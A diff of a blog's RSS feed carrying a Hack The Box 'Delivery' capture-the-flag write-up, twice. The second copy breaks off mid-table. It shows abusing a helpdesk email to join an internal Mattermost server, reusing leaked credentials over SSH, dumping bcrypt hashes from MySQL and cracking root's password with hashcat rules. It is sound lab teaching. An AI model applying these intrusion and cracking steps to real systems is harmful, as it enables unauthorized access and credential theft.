@@ -1,14 +1,783 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Tags on The Wolf Den</title>
-    <link>/tags/</link>
+    <link>http://nightwolf56.github.io/tags/</link>
     <description>Recent content in Tags on The Wolf Den</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     
-        <atom:link href="/tags/index.xml" rel="self" type="application/rss+xml" />
+        <atom:link href="http://nightwolf56.github.io/tags/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>HTB Delivery</title>
+      <link>http://nightwolf56.github.io/htb-writeups/delivery-writeup.md/</link>
+      <pubDate>Sat, 22 May 2021 00:00:00 +0000</pubDate>
+      
+      <guid>http://nightwolf56.github.io/htb-writeups/delivery-writeup.md/</guid>
+      <description>&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-logo.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;In Delivery, we will leverage missconfigurations in a ticketing system and internal communications channels to gain access to where we certainly shouldn&amp;rsquo;t be able to go.  We will also see another example of where weak and reused passwords make our job easy.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;Starting off with a standard NMAP scan and shows  both a SSH server on port 22 and a web server on port 80.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-01-12 15:22 UTC
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.222
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Welcome
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 15.60 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Without any credentials to try for SSH, it makes the most since to tackle the web server first.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-homepage.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;There isn&amp;rsquo;t much new here but there are links to a few other useful pages. A Helpdesk link and a contact page in that tells about a few ways to get in contact with the team.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-contactus.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;If users have a &lt;code&gt;@delivery.htb&lt;/code&gt; email, sign up for an internal Mattermost server. Lacking that, unregistered users can open a ticket on a help desk platform.so we start by checking out the ticket system. The same one linked by from help desk on the home page.&lt;/p&gt;
+&lt;h3 id=&#34;os-ticket&#34;&gt;OS Ticket&lt;/h3&gt;
+&lt;p&gt;This leads to another subdomain. &lt;code&gt;http://helpdesk.delivery.htb/&lt;/code&gt;, which means &lt;code&gt;/et/hosts&lt;/code&gt; will need to be edited to make it reachable.&lt;/p&gt;
+&lt;p&gt;A user account is not required prior to creating a ticket. It asks for standard information, name, email address, description of the problem, and so on.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-ticketcreatepage.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Doesn&amp;rsquo;t seem to be a whole lot here. We can pull up our ticket using the info on this page for editing and further communication and we also have an email that we could send replies too.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-ticketopeneedpage.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;From the ticket&amp;rsquo;s status page, we can see the info we submitted to open the ticket originally.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-ticketmade.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;An attempt can be made  to register an account, but it requires email verification. As HTB boxes are not connected to the internet, there is never going to be a confirmation email.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-accontconfirmationrequired.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h3 id=&#34;foothold-mattermost-and-credential-reuse&#34;&gt;Foothold, Mattermost and Credential Reuse&lt;/h3&gt;
+&lt;p&gt;The next thing to look at is the Mattermost instance.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-mattermostloginpage.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;There is a login page but no credentials so far. It&amp;rsquo;s possible to attempt to register but a  &lt;code&gt;@delivery.htb&lt;/code&gt; email account is required. A fake email could be submitted.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-mattermostsignuppage.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;But&amp;hellip; email verification is also required for Mattermost. It might seem to be a dead end. However,  a user &lt;em&gt;can&lt;/em&gt; register a &lt;code&gt;@delivery.htb&lt;/code&gt; email account. It just takes a bit of creativity.&lt;/p&gt;
+&lt;p&gt;Recall the ticket created on the OS Ticket platform, it provided an email that could be send replies to the ticket. Prehapes, it can be used as a valid &lt;code&gt;@deliery.htb&lt;/code&gt; email to register for the internal Mattermost server.&lt;/p&gt;
+&lt;p&gt;Sure enough, the email given by the support ticket can receive email confirmation&amp;rsquo;s from Mattermost.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-verificationlinkiniticket.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Once the an account is verified it can be used to login to Mattermost.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-emailverified.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;There are a few more steps in the account setup, including joining the Internal channel. Time to see what juicy secrets are being kept in their channels.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-mattermostinternalteam.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;There are a few things to learn from this page. First, there are some credentials that can potentially be used to login elsewhere the OS Ticket platform and based on the conversation, they might work other places as well. &lt;code&gt;maildeliverer:Youve_G0t_Mail!&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The above credentials can be used to access the Agent Sign in on OS Ticket. There might be other interesting info here but there doens&amp;rsquo;t seem to be much here in this case.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-osticketagentlogin.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-osticketagentpanel.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-osticketagentlogin.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;However, the Mattermost channel also mentioned that password reuse was a problem. These credentials will likely work elsewhere.  Turns out one such place is, SSH.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-maildelivererssh.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;root-password-cracking&#34;&gt;Root: Password Cracking&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;maildelivery&lt;/code&gt; doesn&amp;rsquo;t have any interesting groups or sudo rights. It might be able to access where Mattermost credentials are stored.  That would lead to some hashes we could likely crack.&lt;/p&gt;
+&lt;p&gt;First thing to try is to check the Mattermost &lt;code&gt;config.json&lt;/code&gt; stored in &lt;code&gt;/opt/mattermost/config&lt;/code&gt; There the credentials Mattermost uses to interact with a local mysql database, &lt;code&gt;mmuser:Crack_The_MM_Admin_PW&lt;/code&gt;, are found.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-mattermostsqlsettings.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;These can be used to login into the local mysql instance.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-mysqldbaccess.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Listing the databases shows there is one for Mattermost. Among the tables it contains, is one for users.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-mattermostdatabase.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Select the username and password fields and listing the contents to reveal the hash for the &amp;ldquo;root&amp;rdquo; user.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;MariaDB &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;mattermost&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; Username, password from Users;
++----------------------------------+--------------------------------------------------------------+
+| Username                         | password                                                     |
++----------------------------------+--------------------------------------------------------------+
+| surveybot                        |                                                              |
+| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
+| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
+| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
+| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
+| channelexport                    |                                                              |
+| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+| a9647633                         | $2a$10$NPohGjjgCpRgA6fyFTnKhO5Y4l5XZchc7ax5mcOplVPU/qN/KjQri |
++----------------------------------+--------------------------------------------------------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;On the internal Mattermost channel, it was mentioned that &amp;ldquo;PleasSubcribe!&amp;rdquo; was probably used a lot and though it wasn&amp;rsquo;t in rockyou.txt the admin thought it could be cracked pretty trivially with some rules.&lt;/p&gt;
+&lt;p&gt;Before it can be cracked, the hash type needs to be identified.  Hash identifier can typically get you on the right track with these and this one is predicted to be bcrypt.&lt;/p&gt;
+&lt;p&gt;Rules are a way to create variations of Passwords without needing a larger password file. They can be things like adding &lt;code&gt;1234&lt;/code&gt; at the end of a password or exchanging &amp;ldquo;a&amp;rdquo; for &amp;ldquo;@&amp;rdquo;. Hashcat includes a number of rules configuration files and they can be a good starting point. Next a &amp;ldquo;wordlist&amp;rdquo; with the single the single password, &amp;ldquo;PleaseSubscribe!&amp;rdquo; is created.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-PowerShell&#34; data-lang=&#34;PowerShell&#34;&gt;.\hashcat64.exe -a 0 -m 3200 .\hashes_in.txt .\wordlist.txt -r .\rules\base64.rule
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-hashcatcracked.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;A result comes back pretty quickly.&lt;code&gt;root:PleaseSubscribe!21&lt;/code&gt; That can be used to login over SSH and gain full access over the machine.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-root.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;notetxt&#34;&gt;note.txt&lt;/h2&gt;
+&lt;p&gt;IppSec left a note.txt providing some more context and inspiration behind the foothold on this box. I highly recommend giving it a read.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@Delivery:~# cat note.txt
+I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I&#39;ve seen several times.  The inspiration for the box is here:
+
+- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
+
+Keep on hacking! And please don&#39;t forget to subscribe to all the security streamers out there.
+
+- ippsec
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the spirit of the note, here are some cybersecurity streamers and YouTubers I would recommend checking out.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;IppSec&lt;/a&gt;
+, the creator or this box, releases a video writeups for HTB boxes are they retire. They are very well put together and I would highly recommend checking them out for HTB or using &lt;a href=&#34;https://ippsec.rocks/&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;his site&lt;/a&gt;
+ to lookup specific tools or situations you might encounter.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCVeW9qkBjo3zosnqUbG7CFw&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;John Hammond&lt;/a&gt;
+ posts video writeups for various CTFs and wargames. Awesome friendly guy and I totally recommend checking him out especially if you are looking to get started as a beginner.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;LiveOverflow&lt;/a&gt;
+ makes videos on various CTF challenges and also dug into several other topics in some short series including, hardware security research, browser exploitation, Pwn Adventure 3 (a game designed for hacking) and a whole lot more.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/channel/UC3S8vxwRfqLBdIhgRlDRVzw&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;StackSmashing&lt;/a&gt;
+ has done some really cool things in relation to hardware, reverse engineering, and hacking handheld game devices. There is also a few on reversing WannaCry and one about reversing and modifying an IoT Camera.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Gynvael&lt;/a&gt;
+ streams regularly each week on various cyber security topics. One things about it is because it is a live stream, you get a chance to see raw work flow and methodology.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.twitch.tv/gamozo&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Gamozo Labs&lt;/a&gt;
+ does a lot of low level programming. His tool of choice is Rust and he has a lot of cool projects to show from writing an OS to a kernel exploit for an older version of Android. I won&amp;rsquo;t claim to understand everything he is doing but it&amp;rsquo;s very fun to hang around and I still manage to pick up bits and pieces. He posts many of his past streams on &lt;a href=&#34;https://www.youtube.com/channel/UC17ewSS9f2EnkCyMztCdoKA&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;YouTube&lt;/a&gt;
+.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCW6MNdOsqv2E9AjQkv9we7A&#34;target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;PwnFunction&lt;/a&gt;
+ has some really awesome dives explaining various web vulnerabilities, what causes them and how to exploit them. Recently he has also been working on a Binary Exploitation series.&lt;/p&gt;
+&lt;p&gt;If you are looking for &lt;em&gt;even more&lt;/em&gt; cybersecurity content creators, check out this video -&amp;gt; &lt;a href=&#34;https://www.youtube.com/watch?v=GSraDuD4ziQ&#34;&gt;https://www.youtube.com/watch?v=GSraDuD4ziQ&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;wrap-up&#34;&gt;Wrap up&lt;/h2&gt;
+&lt;p&gt;This box is probably one of my favorites simply because the foothold was so satisfying once I figured out and yet incredibly simple. I really appreciate IppSec taking the time to make this box and include the note about the inspiration. Hopefully, it was insightful for the rest of you as well.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>HTB Delivery</title>
+      <link>http://nightwolf56.github.io/posts/delivery-writeup.md/</link>
+      <pubDate>Sat, 22 May 2021 00:00:00 +0000</pubDate>
+      
+      <guid>http://nightwolf56.github.io/posts/delivery-writeup.md/</guid>
+      <description>&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-logo.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;In Delivery, we will leverage missconfigurations in a ticketing system and internal communications channels to gain access to where we certainly shouldn&amp;rsquo;t be able to go.  We will also see another example of where weak and reused passwords make our job easy.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;Starting off with a standard NMAP scan and shows  both a SSH server on port 22 and a web server on port 80.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.91 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2021-01-12 15:22 UTC
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.222
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Welcome
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 15.60 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Without any credentials to try for SSH, it makes the most since to tackle the web server first.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-homepage.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;There isn&amp;rsquo;t much new here but there are links to a few other useful pages. A Helpdesk link and a contact page in that tells about a few ways to get in contact with the team.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-contactus.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;If users have a &lt;code&gt;@delivery.htb&lt;/code&gt; email, sign up for an internal Mattermost server. Lacking that, unregistered users can open a ticket on a help desk platform.so we start by checking out the ticket system. The same one linked by from help desk on the home page.&lt;/p&gt;
+&lt;h3 id=&#34;os-ticket&#34;&gt;OS Ticket&lt;/h3&gt;
+&lt;p&gt;This leads to another subdomain. &lt;code&gt;http://helpdesk.delivery.htb/&lt;/code&gt;, which means &lt;code&gt;/et/hosts&lt;/code&gt; will need to be edited to make it reachable.&lt;/p&gt;
+&lt;p&gt;A user account is not required prior to creating a ticket. It asks for standard information, name, email address, description of the problem, and so on.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-ticketcreatepage.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Doesn&amp;rsquo;t seem to be a whole lot here. We can pull up our ticket using the info on this page for editing and further communication and we also have an email that we could send replies too.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-ticketopeneedpage.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;From the ticket&amp;rsquo;s status page, we can see the info we submitted to open the ticket originally.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-ticketmade.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;An attempt can be made  to register an account, but it requires email verification. As HTB boxes are not connected to the internet, there is never going to be a confirmation email.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-accontconfirmationrequired.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h3 id=&#34;foothold-mattermost-and-credential-reuse&#34;&gt;Foothold, Mattermost and Credential Reuse&lt;/h3&gt;
+&lt;p&gt;The next thing to look at is the Mattermost instance.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-mattermostloginpage.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;There is a login page but no credentials so far. It&amp;rsquo;s possible to attempt to register but a  &lt;code&gt;@delivery.htb&lt;/code&gt; email account is required. A fake email could be submitted.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-mattermostsignuppage.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;But&amp;hellip; email verification is also required for Mattermost. It might seem to be a dead end. However,  a user &lt;em&gt;can&lt;/em&gt; register a &lt;code&gt;@delivery.htb&lt;/code&gt; email account. It just takes a bit of creativity.&lt;/p&gt;
+&lt;p&gt;Recall the ticket created on the OS Ticket platform, it provided an email that could be send replies to the ticket. Prehapes, it can be used as a valid &lt;code&gt;@deliery.htb&lt;/code&gt; email to register for the internal Mattermost server.&lt;/p&gt;
+&lt;p&gt;Sure enough, the email given by the support ticket can receive email confirmation&amp;rsquo;s from Mattermost.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-verificationlinkiniticket.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Once the an account is verified it can be used to login to Mattermost.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-emailverified.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;There are a few more steps in the account setup, including joining the Internal channel. Time to see what juicy secrets are being kept in their channels.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-mattermostinternalteam.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;There are a few things to learn from this page. First, there are some credentials that can potentially be used to login elsewhere the OS Ticket platform and based on the conversation, they might work other places as well. &lt;code&gt;maildeliverer:Youve_G0t_Mail!&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The above credentials can be used to access the Agent Sign in on OS Ticket. There might be other interesting info here but there doens&amp;rsquo;t seem to be much here in this case.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-osticketagentlogin.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-osticketagentpanel.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-osticketagentlogin.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;However, the Mattermost channel also mentioned that password reuse was a problem. These credentials will likely work elsewhere.  Turns out one such place is, SSH.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-maildelivererssh.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;h2 id=&#34;root-password-cracking&#34;&gt;Root: Password Cracking&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;maildelivery&lt;/code&gt; doesn&amp;rsquo;t have any interesting groups or sudo rights. It might be able to access where Mattermost credentials are stored.  That would lead to some hashes we could likely crack.&lt;/p&gt;
+&lt;p&gt;First thing to try is to check the Mattermost &lt;code&gt;config.json&lt;/code&gt; stored in &lt;code&gt;/opt/mattermost/config&lt;/code&gt; There the credentials Mattermost uses to interact with a local mysql database, &lt;code&gt;mmuser:Crack_The_MM_Admin_PW&lt;/code&gt;, are found.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-mattermostsqlsettings.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;These can be used to login into the local mysql instance.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-mysqldbaccess.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Listing the databases shows there is one for Mattermost. Among the tables it contains, is one for users.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/delivery-mattermostdatabase.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;Select the username and password fields and listing the contents to reveal the hash for the &amp;ldquo;root&amp;rdquo; user.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;MariaDB &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;mattermost&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; Username, password from Users;
++----------------------------------+--------------------------------------------------------------+
